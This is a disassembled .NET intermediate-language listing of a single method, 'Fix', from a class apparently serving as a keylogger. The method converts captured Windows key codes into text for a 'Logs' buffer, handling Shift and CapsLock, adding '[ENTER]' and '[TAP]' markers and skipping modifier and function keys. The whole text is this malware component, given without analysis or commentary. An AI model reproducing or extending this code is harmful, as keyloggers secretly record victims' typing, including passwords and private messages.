  .method private instance string  Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys k) cil managed
  {
    // Code size       396 (0x18c)
    .maxstack  3
    .locals init (string V_0,
             bool V_1,
             class [mscorlib]System.Exception V_2,
             valuetype [System.Windows.Forms]System.Windows.Forms.Keys V_3,
             char V_4)
    IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_000a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_ShiftKeyDown()
    IL_000f:  stloc.1
    IL_0010:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
    IL_0015:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
    IL_001a:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CapsLock()
    IL_001f:  brfalse.s  IL_002a

    IL_0021:  ldloc.1
    IL_0022:  brfalse.s  IL_0028

    IL_0024:  ldc.i4.0
    IL_0025:  stloc.1
    IL_0026:  br.s       IL_002a

    IL_0028:  ldc.i4.1
    IL_0029:  stloc.1
    .try
    {
      IL_002a:  ldarg.1
      IL_002b:  stloc.3
      IL_002c:  ldloc.3
      IL_002d:  ldc.i4.s   46
      IL_002f:  beq.s      IL_0035

      IL_0031:  ldloc.3
      IL_0032:  ldc.i4.8
      IL_0033:  bne.un.s   IL_0055

      IL_0035:  ldstr      "["
      IL_003a:  ldarg.1
      IL_003b:  box        [System.Windows.Forms]System.Windows.Forms.Keys
      IL_0040:  callvirt   instance string [mscorlib]System.Enum::ToString()
      IL_0045:  ldstr      "]"
      IL_004a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_004f:  stloc.0
      IL_0050:  leave      IL_018a

      IL_0055:  ldloc.3
      IL_0056:  ldc.i4     0xa0
      IL_005b:  beq.s      IL_00d8

      IL_005d:  ldloc.3
      IL_005e:  ldc.i4     0xa1
      IL_0063:  beq.s      IL_00d8

      IL_0065:  ldloc.3
      IL_0066:  ldc.i4     0x10000
      IL_006b:  beq.s      IL_00d8

      IL_006d:  ldloc.3
      IL_006e:  ldc.i4.s   16
      IL_0070:  beq.s      IL_00d8

      IL_0072:  ldloc.3
      IL_0073:  ldc.i4     0x20000
      IL_0078:  beq.s      IL_00d8

      IL_007a:  ldloc.3
      IL_007b:  ldc.i4.s   17
      IL_007d:  beq.s      IL_00d8

      IL_007f:  ldloc.3
      IL_0080:  ldc.i4     0xa3
      IL_0085:  beq.s      IL_00d8

      IL_0087:  ldloc.3
      IL_0088:  ldc.i4     0xa2
      IL_008d:  beq.s      IL_00d8

      IL_008f:  ldloc.3
      IL_0090:  ldc.i4     0x40000
      IL_0095:  beq.s      IL_00d8

      IL_0097:  ldloc.3
      IL_0098:  ldc.i4.s   112
      IL_009a:  beq.s      IL_00d8

      IL_009c:  ldloc.3
      IL_009d:  ldc.i4.s   113
      IL_009f:  beq.s      IL_00d8

      IL_00a1:  ldloc.3
      IL_00a2:  ldc.i4.s   114
      IL_00a4:  beq.s      IL_00d8

      IL_00a6:  ldloc.3
      IL_00a7:  ldc.i4.s   115
      IL_00a9:  beq.s      IL_00d8

      IL_00ab:  ldloc.3
      IL_00ac:  ldc.i4.s   116
      IL_00ae:  beq.s      IL_00d8

      IL_00b0:  ldloc.3
      IL_00b1:  ldc.i4.s   117
      IL_00b3:  beq.s      IL_00d8

      IL_00b5:  ldloc.3
      IL_00b6:  ldc.i4.s   118
      IL_00b8:  beq.s      IL_00d8

      IL_00ba:  ldloc.3
      IL_00bb:  ldc.i4.s   119
      IL_00bd:  beq.s      IL_00d8

      IL_00bf:  ldloc.3
      IL_00c0:  ldc.i4.s   120
      IL_00c2:  beq.s      IL_00d8

      IL_00c4:  ldloc.3
      IL_00c5:  ldc.i4.s   121
      IL_00c7:  beq.s      IL_00d8

      IL_00c9:  ldloc.3
      IL_00ca:  ldc.i4.s   122
      IL_00cc:  beq.s      IL_00d8

      IL_00ce:  ldloc.3
      IL_00cf:  ldc.i4.s   123
      IL_00d1:  beq.s      IL_00d8

      IL_00d3:  ldloc.3
      IL_00d4:  ldc.i4.s   35
      IL_00d6:  bne.un.s   IL_00e3

      IL_00d8:  ldstr      ""
      IL_00dd:  stloc.0
      IL_00de:  leave      IL_018a

      IL_00e3:  ldloc.3
      IL_00e4:  ldc.i4.s   32
      IL_00e6:  bne.un.s   IL_00f3

      IL_00e8:  ldstr      " "
      IL_00ed:  stloc.0
      IL_00ee:  leave      IL_018a

      IL_00f3:  ldloc.3
      IL_00f4:  ldc.i4.s   13
      IL_00f6:  beq.s      IL_00fd

      IL_00f8:  ldloc.3
      IL_00f9:  ldc.i4.s   13
      IL_00fb:  bne.un.s   IL_011f

      IL_00fd:  ldarg.0
      IL_00fe:  ldfld      string j.kl::Logs
      IL_0103:  ldstr      "[ENTER]\r\n"
      IL_0108:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
      IL_010d:  brfalse.s  IL_0117

      IL_010f:  ldstr      ""
      IL_0114:  stloc.0
      IL_0115:  leave.s    IL_018a

      IL_0117:  ldstr      "[ENTER]\r\n"
      IL_011c:  stloc.0
      IL_011d:  leave.s    IL_018a

      IL_011f:  ldloc.3
      IL_0120:  ldc.i4.s   9
      IL_0122:  bne.un.s   IL_012c

      IL_0124:  ldstr      "[TAP]\r\n"
      IL_0129:  stloc.0
      IL_012a:  leave.s    IL_018a

      IL_012c:  ldloc.1
      IL_012d:  brfalse.s  IL_013e

      IL_012f:  ldarg.1
      IL_0130:  conv.ovf.u4
      IL_0131:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_0136:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_013b:  stloc.0
      IL_013c:  leave.s    IL_018a

      IL_013e:  ldarg.1
      IL_013f:  conv.ovf.u4
      IL_0140:  call       string j.kl::VKCodeToUnicode(uint32)
      IL_0145:  stloc.0
      IL_0146:  leave.s    IL_018a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0148:  dup
      IL_0149:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_014e:  stloc.2
      IL_014f:  ldloc.1
      IL_0150:  brfalse.s  IL_016e

      IL_0152:  ldarg.1
      IL_0153:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_0158:  stloc.s    V_4
      IL_015a:  ldloca.s   V_4
      IL_015c:  call       instance string [mscorlib]System.Char::ToString()
      IL_0161:  callvirt   instance string [mscorlib]System.String::ToUpper()
      IL_0166:  stloc.0
      IL_0167:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_016c:  leave.s    IL_018a

      IL_016e:  ldarg.1
      IL_016f:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_0174:  stloc.s    V_4
      IL_0176:  ldloca.s   V_4
      IL_0178:  call       instance string [mscorlib]System.Char::ToString()
      IL_017d:  callvirt   instance string [mscorlib]System.String::ToLower()
      IL_0182:  stloc.0
      IL_0183:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0188:  leave.s    IL_018a

    }  // end handler
    IL_018a:  ldloc.0
    IL_018b:  ret
  } // end of method kl::Fix
